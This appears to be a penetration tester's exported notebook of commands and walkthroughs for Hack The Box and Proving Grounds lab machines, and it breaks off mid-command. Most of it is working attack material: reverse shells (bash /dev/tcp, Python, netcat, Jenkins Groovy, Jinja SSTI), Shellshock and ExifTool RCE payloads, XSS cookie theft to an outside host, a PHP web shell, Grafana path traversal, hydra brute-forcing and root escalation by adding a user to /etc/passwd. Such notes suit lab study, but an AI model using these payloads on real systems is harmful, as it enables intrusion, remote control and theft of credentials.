--range 1-65535 --ulimit 5000 -- -A<br /><br /><br /> nmap -sV -T5 10.10.10.56<br /><br />nmap -A -p- 10.10.10.138<br /><br /> nikto -h http://10.10.10.138<br /><br />gobuster dir -u 10.10.10.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -t 40<br /><br />smbmap -H 10.10.10.134 -u anonymous   <br /><br />smbclient //10.10.10.134/Backups/ -u anonymous   <br /><br />gobuster dir -u 10.10.10.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -t 1<br /><br /><br />gobuster dir -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x /usr/share/wordlists/dirb/extensions_common.txt -t 60<br /><br />The -f flag appends / to each request in gobuster.<br /><br /><br />gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi<br /><br /><br />SHELLSHOCK<br />curl -A &quot;() { :; }; /bin/bash -i &gt; /dev/tcp/10.10.16.10/6666 0&lt;&amp;1 2&gt;&amp;1&quot; <a href="http://192.168.2.18/cgi-bin/helloworld.cgi">http://10.10.10.56/cgi-bin/</a>user.sh<br /><br /><br />wget -U &quot;() { test;};echo \&quot;Content-type: text/plain\&quot;; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.10/6666 0&gt;&amp;1&quot; http://10.10.10.56/cgi-bin/user.sh<br /><br /><br />smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18</div><div class='page'><h1 class='title level-2'>xss</h1><br/><code>&lt;script&gt;window.location =&#39;http://10.11.17.106/whiskey.php&#39;&lt;/script&gt;</code><br /><br /><br />js file | attack.js<br /><code>var</code> <code>xhttp = new</code> <code>XMLHttpRequest();</code><br /><code>xhttp.open(&quot;POST&quot;,&quot;backdoorchecker.php&quot;, true);</code><br /><code>xhttp.send(&quot;cmd=diras || \\\\10.10.14.7\\smb\\nc.exe -e cmd.exe 10.10.14.7 9090&quot;);</code><br /><br /><br /><br /><code>&lt;script&gt;document.location=&#39;http://10.11.17.106:8000/grabber.php?c=&#39;+document.cookie&lt;/script&gt;</code><br /><br /><br /><code>&lt;script&gt;fetch(&quot;http://10.11.17.106:8000/&quot;+document.cookie)&lt;/script&gt;</code></div><div class='page'><h1 class='title level-2'>jenkins</h1><br/>r = Runtime.getRuntime()<br />p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.11.17.106/6666;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br />p.waitFor()</div><div class='page'><h1 class='title level-2'>reverse_shells</h1><br/><strong>JINJA</strong><br /><br />python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br />{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.11.17.106\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;, \&quot;-i\&quot;]);&#39;&quot;).read().zfill(417)}}{%endif%}{% endfor %}</div><div class='page'><h1 class='title level-2'>hashcat</h1><br/><strong>Linux pass crack</strong><br /><code>hashcat </code><strong><code>-m 1800 -a 0 hash_katana.txt </code></strong>/usr/share/wordlists/rockyou.txt</div><div class='page'><h1 class='title level-2'>hydra</h1><br/>hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form &quot;/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&amp;tfUPass=^PASS^:S=logout&quot; -vV -f<br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.2.5 http-post-form &quot;/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=K%2B1hDZDheT7XXRtSuccAUe8CSYyxYRADb92Zsi%2FpOk3GROUReCjdDYSnT1CYtIpr95sIUMxdRimMX79b1EOyxiWmGhGqPvl4tRu8%2BzHif91xSfcDIm6YJBQBWBdSUWpZ20RM6w94v0TyWg2KL%2BVzaKAAhfo%2FzScASgxuLm%2BiYrGAMX3iSvJOZu3ODQR%2BW6m6GCRJJIxd7jhrbYGw3bT07Jk0d4r4q%2BWeUhWHOJ8bjA79u3fI3LBOHpnOokCz%2BWTIjghd%2B%2FX9W%2Bi225mM38s2zuXLaNLe%2FxbIsHdL6IDVw%2FdZHTX56VIBjUXBVigRXah%2FkwHZgDhmTib7QgdGZRhZ5%2BRa4eoB75fesulVxrUAiEQcRNGq&amp;__EVENTVALIDATION=18FOCjEC6Ix9oh%2FfSwZJSc9fgX3WgmopEuye7R8aUh%2FxTQ0N%2Fa%2B%2FEEFlo8nm%2Box8yyexRS%2BT0j3kZUgM5gX%2FDGDQivdWnyDpNvUGbI1TmHnnaN75Fn7HZEO89ScKca8C%2FpwYR5ClRjNXvOUD%2BcRvh9cWrb%2FLj4iEXMATvdONb2Q5LdYu&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=pass&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot;<br /><br /><br /><br /><br />hydra -l milesdyson -P log1.txt 10.10.18.145 http-post-form &quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:incorrect&quot;<br /><br />hydra -l elliot -P fs.dic 10.10.244.178 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=https%3A%2F%2F10.10.244.178%2Fwp-admin%2F&amp;testcookie=1:S=302&quot; -I<br /><br /><br /><br />/blog/wp-login.php<br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 10000 http-post-form &quot;/j_acegi_security_check :j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid&quot;<br /><br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.156.136 http-post-form &quot;/nagiosxi/login.php:nsp=a0c5b6d390b9801118ccb0da5049d27d770778323acd340cb4609f10e813591f&amp;page=auth&amp;debug=&amp;pageopt=login&amp;redirect=%2Fnagiosxi%2Findex.php%3F&amp;username=^USER^&amp;password=^PASS^&amp;loginButton=:S=302&quot; <br /><br /><br />http-auth<br /><code>hydra -l admin -P  -s 8088 -f 192.168.223.83 http-get /</code>protected<br /><br /><br />hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 -f 192.168.223.83 http-get /protected<br /><br />ONLY POST (API LIKE POST e.g Postman)<br />hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.229.77 http-post-form &quot;/auth:?login=^USER^&amp;password=^PASS^:Invalid&quot; -s 8081 </div><div class='page'><h1 class='title level-2'>SSL/Heartbleed</h1><br/>nmap -sV 34.245.235.242 -p 443 --script vuln <br /><br />heartbleed memory disclosure</div><div class='page'><h1 class='title level-2'>smb</h1><br/>smbmap -H 10.10.18.145,<br /><br />smbmap -H 10.10.18.145<br /><br />smbclient //10.10.18.145/anonymous<br /><br /><br />smbclient //10.10.18.145/milesdyson -U &#39;milesdyson&#39;   </div><div class='page'><h1 class='title level-2'>WordPress Enum</h1><br/>For a thorough scan, we will need to provide the URL of the target (--url) and configure the enumerate option (--enumerate) to include &quot;All Plugins&quot; (ap), &quot;All Themes&quot; (at), &quot;Config backups&quot; (cb), and &quot;Db exports&quot; (dbe). The final command can be found in Listing 5 below.<br /><br /><strong><br /></strong><strong><span style="color:#060f94;">kali@kali:~$ wpscan --url sandbox.local --enumerate ap,at,cb,dbe</span></strong><br /><br /><span style="color:#237522;">if you just type -e it does not properly scan some of the things sometimes!!!</span> (because of passive mode probably)<br /><br /><br />Hash Crack<br /><br />hashcat -O -m 400 -a 0 -o cracked.txt pass.txt /usr/share/wordlists/rockyou.txt  <br /><br />john --format=phpass --wordlist/usr/share/wordlists/rockyou.txt</div><div class='page'><h1 class='title level-1'>PG Boxes</h1><br/></div><div class='page'><h1 class='title level-2'>Sorcerer.pg</h1><br/>└─# nmap -sV -sC   192.168.95.100   -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-09-30 22:42 +03<br />Nmap scan report for 192.168.95.100<br />Host is up (0.14s latency).<br />Not shown: 65525 closed ports<br />PORT      STATE SERVICE  VERSION<br />22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)<br />|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)<br />|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)<br />80/tcp    open  http     nginx<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />111/tcp   open  rpcbind  2-4 (RPC #100000)<br />| rpcinfo: <br />|   program version    port/proto  service<br />|   100000  2,3,4        111/tcp   rpcbind<br />|   100000  2,3,4        111/udp   rpcbind<br />|   100003  3           2049/udp   nfs<br />|   100003  3,4         2049/tcp   nfs<br />|   100005  1,2,3      45519/tcp   mountd<br />|   100005  1,2,3      50443/udp   mountd<br />|   100021  1,3,4      43329/tcp   nlockmgr<br />|   100021  1,3,4      50121/udp   nlockmgr<br />|   100227  3           2049/tcp   nfs_acl<br />|_  100227  3           2049/udp   nfs_acl<br />2049/tcp  open  nfs_acl  3 (RPC #100227)<br />7742/tcp  open  http     nginx<br />|_http-title: SORCERER<br />8080/tcp  open  http     Apache Tomcat 7.0.4<br />|_http-favicon: Apache Tomcat<br />|_http-open-proxy: Proxy might be redirecting requests<br />|_http-title: Apache Tomcat/7.0.4<br />43329/tcp open  nlockmgr 1-4 (RPC #100021)<br />45519/tcp open  mountd   1-3 (RPC #100005)<br />54375/tcp open  mountd   1-3 (RPC #100005)<br />55683/tcp open  mountd   1-3 (RPC #100005)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br /><br /><a href="http://192.168.95.100:7742/zipfiles/">http://192.168.95.100:7742/zipfiles/</a><br /><br />id_rsa file works! but no ssh.<br /><br /><br />scp_wrapper.sh (modified to get reverse shell)<br /><br />#!/bin/bash<br />case $SSH_ORIGINAL_COMMAND in<br /> &#39;scp&#39;*)<br />    $SSH_ORIGINAL_COMMAND<br />    ;;<br /> *)<br />    echo &quot;ACCESS DENIED.&quot;<br />    echo &quot;It works!&quot;<br />    python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.95&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br />    scp<br />    ;;<br />esac<br /><br />scp -i id_rsa scp_wrapper.sh max@192.168.95.100:/home/max<br /><br />now ssh with id_rsa listen for port 80 to get a reverse shell<br />linpeas.sh<br /><br />Priv Esc.<br /><code>./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p</code><br /></div><div class='page'><h1 class='title level-2'>exfiltrated.pg</h1><br/><a href="https://www.exploit-db.com/exploits/49876">https://www.exploit-db.com/exploits/49876</a><br />python exploit does not work, manually upload the file<br /><br /><a href="http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw">http://exfiltrated.offsec/panel/uploads/#elf_l1_Lw</a><br /><br />make a phar file with php content:<br /><br />&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;<br /><br />go to http://exfiltrated.offsec/uploads/yourfile.phar?cmd=id<br /><br /><a href="http://exfiltrated.offsec/uploads/whiskey.phar?cmd=id">http://exfiltrated.offsec/uploads/whiskey.phar?cmd=id</a><br /><br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br /><br /><br />www-data@exfiltrated:/var/www/html/subrion/includes$ cat config.inc.php<br />cat config.inc.php<br />&lt;?php<br />/*<br /> * Subrion Open Source CMS 4.2.1<br /> * Config file generated on 10 June 2021 12:04:54<br /> */<br /><br />define(&#39;INTELLI_CONNECT&#39;, &#39;mysqli&#39;);<br />define(&#39;INTELLI_DBHOST&#39;, &#39;localhost&#39;);<br />define(&#39;INTELLI_DBUSER&#39;, &#39;subrionuser&#39;);<br />define(&#39;INTELLI_DBPASS&#39;, &#39;target100&#39;);<br />define(&#39;INTELLI_DBNAME&#39;, &#39;subrion&#39;);<br />define(&#39;INTELLI_DBPORT&#39;, &#39;3306&#39;);<br />define(&#39;INTELLI_DBPREFIX&#39;, &#39;sbr421_&#39;);<br /><br /><br />CRONJOB<br />* *     * * *   root    bash /opt/image-exif.sh  <br /><br />===============================================<br />$ $ cat /opt/image-exif.sh <br />#! /bin/bash<br />#07/06/18 A BASH script to collect EXIF metadata <br /><br />echo -ne &quot;\\n metadata directory cleaned! \\n\\n&quot;<br /><br /><br />IMAGES=&#39;/var/www/html/subrion/uploads&#39;<br /><br />META=&#39;/opt/metadata&#39;<br />FILE=`openssl rand -hex 5`<br />LOGFILE=&quot;$META/$FILE&quot;<br /><br />echo -ne &quot;\\n Processing EXIF metadata now... \\n\\n&quot;<br />ls $IMAGES | grep &quot;jpg&quot; | while read filename; <br />do <br />    exiftool &quot;$IMAGES/$filename&quot; &gt;&gt; $LOGFILE <br />done<br /><br />echo -ne &quot;\\n\\n Processing is finished! \\n\\n\\n&quot;<br />===============================================<br /><br /><a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/</a><br /><br />(metadata &quot;\c${system(&#39;ping -c4 192.168.49.178&#39;)};&quot;)<br /><br />payload<br />(metadata &quot;\c${system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.178 6666 &gt;/tmp/f&#39;)};&quot;)<br /><br /><code>$ sudo apt install djvulibre-bin </code><br /><code># Installs the required tools </code><br /> <br /><code>$ bzz payload payload.bzz</code><br /><code># Compress our payload file with to make it non human-readable</code><br /> <br /><code>$ djvumake exploit.jpg INFO=&#39;1,1&#39;</code> <code>BGjp=/dev/null ANTz=payload.bzz</code><br /><br />upload it to /var/www/html/subrion/uploads<br /><br /></div><div class='page'><h1 class='title level-2'>nibbles.pg</h1><br/>└─# nmap -sV -sC    192.168.51.47  -p-<br />Starting Nmap 7.91 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2021-10-01 12:12 +03<br />Nmap scan report for 192.168.51.47<br />Host is up (0.14s latency).                              <br />Not shown: 65529 filtered ports          <br />PORT     STATE  SERVICE      VERSION                                                                              <br />21/tcp   open   ftp          vsftpd 3.0.3<br />22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br />| ssh-hostkey:                                                                                                    <br />|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)   <br />|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)<br />|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)<br />80/tcp   open   http         Apache httpd 2.4.38 ((Debian))     <br />|_http-server-header: Apache/2.4.38 (Debian)<br />|_http-title: Enter a title, displayed at the top of the window.<br />139/tcp  closed netbios-ssn                              <br />445/tcp  closed microsoft-ds          <br />5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7<br />| ssl-cert: Subject: commonName=debian <br />| Subject Alternative Name: DNS:debian <br />| Not valid before: 2020-04-27T15:41:47           <br />|_Not valid after:  2030-04-25T15:41:47                                                                           <br />|_ssl-date: TLS randomness does not represent time<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel    <br /><br /><br />default creds for postgre ⇒ postgres:postgres<br />psql -h 192.168.51.47 -p 5437 -U postgres<br /><br />DROP TABLE IF EXISTS cmd_exec;<br />CREATE TABLE cmd_exec(cmd_output text);<br />COPY cmd_exec FROM PROGRAM &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.49.51 80 &gt;/tmp/f;&#39;;<br /><br />nc -nvlp 80<br /><br />find SUID<br /><br />find . -exec /bin/sh -p \; quit;<br />whoami<br />root<br /></div><div class='page'><h1 class='title level-2'>fanatastic.pg</h1><br/>Open 192.168.158.181:22<br />Open 192.168.158.181:3000<br />Open 192.168.158.181:9090<br /><br /><br /><br /><br />GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1<br />Host: 192.168.158.181:3000<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: redirect_to=§%2F..%27%2520%2B%2520file_to_read§<br />Upgrade-Insecure-Requests: 1<br /><br /><br /><br />grafana:x:113:117::/usr/share/grafana:/bin/false<br />prometheus:x:1000:1000::/home/prometheus:/bin/false<br />sysadmin:x:1001:1001::/home/sysadmin:/bin/sh<br /><br /><br /><code>/var/lib/grafana/grafana.db</code><br /><br />GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini HTTP/1.1<br />Host: 192.168.158.181:3000<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: redirect_to=§%2F..%27%2520%2B%2520file_to_read§<br />Upgrade-Insecure-Requests: 1<br /><strong><br />get basic auth key from data_source in grafana.db</strong><br /><br />┌──(root㉿kali)-[/home/kali/Desktop]<br />└─# go run AESDecrypt.go<br />[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm<br />[*] DataSourcePassword= anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==<br />[*] plainText= SuperSecureP@ssw0rd<br /><br /><br /><code>$ id<br />uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)</code><br /><br />disk group<br /><br />This privilege is almost <strong>equivalent to root access</strong> as you can access all the data inside of the machine.<br /><br />df -h #Find where &quot;/&quot; is mounted<br />debugfs /dev/sda1<br />debugfs: cd /root<br />debugfs: ls<br />debugfs: cat /root/.ssh/id_rsa<br />debugfs: cat /etc/shadow</div><div class='page'><h1 class='title level-2'>snookums.pg</h1><br/>PORT      STATE SERVICE     REASON         VERSION                                                                                                                                  [163/245]<br />21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.2                                                                                                                                      <br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                       <br />|_Can&#39;t get directory listing: TIMEOUT                                                                                                                                                       <br />| ftp-syst:                                                                                                                                                                                  <br />|   STAT:                                                                                                                                                                                    <br />| FTP server status:                                                                                                                                                                         <br />|      Connected to ::ffff:192.168.49.55                                                                                                                                                     <br />|      Logged in as ftp                                                                                                                                                                      <br />|      TYPE: ASCII                                                                                                                                                                           <br />|      No session bandwidth limit                                                                                                                                                            <br />|      Session timeout in seconds is 300                                                                                                                                                     <br />|      Control connection is plain text                                                                                                                                                      <br />|      Data connections will be plain text                                                                                                                                                   <br />|      At session startup, client count was 4                                                                                                                                                <br />|      vsFTPd 3.0.2 - secure, fast, stable                                                                                                                                                   <br />|_End of status                                                                                                                                                                              <br />22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)                                                                                                                        <br />| ssh-hostkey:                                                                                                                                                                               <br />|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)                                                                                                                               <br />| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtUk/m8ssh+nfn52VkolWbpJihGyH2vdELXJv/X0HIj5hbkXnM1QgSSKltTq+cev1QtkrwtUTV3j2AD5Ftxz7ivrm0PvsGNI6QGnIxdAwCvt1OjDHoz6IGDS4kz5IcW3Q3SmwceCwDKPA55mupKhK<br />lKjkZyLn4+d9An50AV1Hyj+E8APALHQBQFVp7cdJe9lqj7K8dxNVo1XExUDgU3trRSGDO5bZN7C57VsHXN6MIITU9RtyMhLbxYwA6KTU8RluW1/5v7T4EnHlRZcdmbneVcefK+EK69Mgdn5L+ww/5YrWiYbXDOUTEymWfeyoOl2LoFBD/nmSb9hayKirR<br />4guf                                                                                                                                                                                         <br />|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)                                                                                                                              <br />| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOk5HGeIHhlXkWc9v507Ap0zc5wnKxhGa7WG9fWJhL/yr9bveHEBZllHErnP6vaWM4WRudCxA6z6rqnhep9wNW8=                           <br />|   256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)                                                                                                                            <br />|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDvde70kt/TjqXRmChJ0XvKYTpljMNu6TKlAtF/S4IHL                                                                                                           <br />80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)                                                                                                          <br />|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16                                                                                                                                       <br />|_http-title: Simple PHP Photo Gallery                                                                                                                                                       <br />| http-methods:                                                                                                                                                                              <br />|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                 <br />111/tcp   open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)                                                                                                                                 <br />| rpcinfo:                                                                                                                                                                                   <br />|   program version    port/proto  service                                                                                                                                                   <br />|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                   <br />|   100000  2,3,4        111/udp   rpcbind                                                                                                                                                   <br />|   100000  3,4          111/tcp6  rpcbind                                                                                                                                                   <br />|_  100000  3,4          111/udp6  rpcbind                                                                                                                                                   <br />139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: SAMBA)                                                                                                           <br />445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 (workgroup: SAMBA)                                                                                                              <br />3306/tcp  open  mysql       syn-ack ttl 63 MySQL (unauthorized)                                                                                                                              <br />33060/tcp open  mysqlx?     syn-ack ttl 63                                                                                                                                                   <br />| fingerprint-strings:                                                                                                                                                                       <br />|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:                                                                                               <br />|     Invalid message&quot;                                                                                                                                                                       <br />|_    HY000                                                                               <br /><br /><br /><br />LFI<br /><a href="http://192.168.55.58/image.php?img=../../../../../../../../etc/passwd">http://192.168.55.58/image.php?img=../../../../../../../../etc/passwd</a><br /><br />RFI<br /><a href="http://192.168.55.58/image.php?img=">http://192.168.55.58/image.php?img=</a>php://input<br /><br />GET /image.php?img=php://input HTTP/1.1<br />Host: 192.168.55.58<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: __utma=86279768.112664281.1648943988.1648943988.1648943988.1; __utmc=86279768; __utmz=86279768.1648943988.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)<br />Upgrade-Insecure-Requests: 1<br />Cache-Control: max-age=0<br />Content-Length: 41<br /><br />&lt;?php system(&#39;ping 192.168.49.55 -c4&#39;);?&gt;<br /><br />GET /image.php?img=php://input HTTP/1.1<br />Host: 192.168.55.58<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Cookie: __utma=86279768.112664281.1648943988.1648943988.1648943988.1; __utmc=86279768; __utmz=86279768.1648943988.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)<br />Upgrade-Insecure-Requests: 1<br />Cache-Control: max-age=0<br />Content-Length: 41<br /><br />&lt;?php system(&#39;bash -i &gt;&amp; /dev/tcp/192.168.49.55/80 0&gt;&amp;1);?&gt;<br /><br />bash -i &gt;&amp; /dev/tcp/192.168.49.55/8080 0&gt;&amp;1<br /><br /><br />mysql password in <br /><br />cat db.php<br />&lt;?php<br />define(&#39;DBHOST&#39;, &#39;127.0.0.1&#39;);<br />define(&#39;DBUSER&#39;, &#39;root&#39;);<br />define(&#39;DBPASS&#39;, &#39;MalapropDoffUtilize1337&#39;);<br />define(&#39;DBNAME&#39;, &#39;SimplePHPGal&#39;);<br /><br /><br />michael:HockSydneyCertify123<br /><br /><br />writable /etc/passwd<br /><br />openssl passwd -1 -salt salt whiskey                     <br />$1$salt$Wlo1/runuSLJSrtbw.YZw0<br /><br />whiskey<code>:$1$salt$Wlo1/runuSLJSrtbw.YZw0:0:0:test:/root:/bin/bash</code><br /><br />echo ‘whiskey<code>:$1$salt$Wlo1/runuSLJSrtbw.YZw0:0:0:test:/root:/bin/bash</code>’ &gt;&gt; /etc/passwd<br /><br />su whiskey<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Exghost.pg</h1><br/><br /><br /><br />hydra -C /opt/SecLists-master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <a href="ftp://192.168.215.183">ftp://192.168.215.183</a> <br />-I<br />Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br /><br />Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2022-03-29 16:04:47<br />[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore<br />[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task<br />[DATA] attacking <a href="ftp://192.168.215.183:21/">ftp://192.168.215.183:21/</a><br />[21][ftp] host: 192.168.215.183   login: user   password: system<br /><br /><br />ftp&gt; passive<br /><br />file backup<br /><br />backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)<br /><br />after reviewing the http stream<br /><br />┌──(root㉿kali)-[/home/kali]                                                                                        <br />└─# ./CVE-2021-22204.sh &quot;reverseme 192.168.49.215 6666&quot; Desktop/Red_Kitten_01.jpg                                   <br />   _____   _____   ___ __ ___ _    ___ ___ ___ __  _ _                                                              <br />  / __\ \ / / __|_|_  )  \_  ) |__|_  )_  )_  )  \| | |                                                             <br /> | (__ \ V /| _|___/ / () / /| |___/ / / / / / () |_  _|                                                            <br />  \___| \_/ |___| /___\__/___|_|  /___/___/___\__/  |_|                                                             <br />                                                                                                                    <br />Creating payload                                                                                                    <br />IP: 192.168.49.215                                                                                                  <br />PORT: 6666                                                                                                          <br />(metadata &quot;\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in(6666,inet_ato<br />n(&#39;192.168.49.215&#39;)))){open(STDIN,&#39;&gt;&amp;S&#39;);open(STDOUT,&#39;&gt;&amp;S&#39;);open(STDERR,&#39;&gt;&amp;S&#39;);exec(&#39;/bin/sh -i&#39;);};};};&quot;)          <br />                                                                                                                    <br />                                                                                                                    <br />    1 image files updated                                                                                           <br />                                                                                                                    <br />Finished     <br /><br />upload malicious file via html upload exiftool.php found before<br /><br />pwnkit<br /><br />have to manually make files on kali then transfer pwnkit.so and exploit file along with the pwnkit folder<br /><br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ ./whiskey                                           <br />./whiskey<br />GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”<br />Cannot run program pwnkit.so:.: No such file or directory<br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules<br />&lt; &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules<br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ ./whiskey<br />./whiskey<br />GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”<br />Cannot run program pwnkit.so:.: No such file or directory<br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ mkdir -p GCONV_PATH=.<br />cp /usr/bin/true GCONV_PATH=./pwnkit.so:.mkdir -p GCONV_PATH=.<br />www-data@exghost:/tmp/pwn/CVE-2021-4034$ <br />&lt;021-4034$ cp 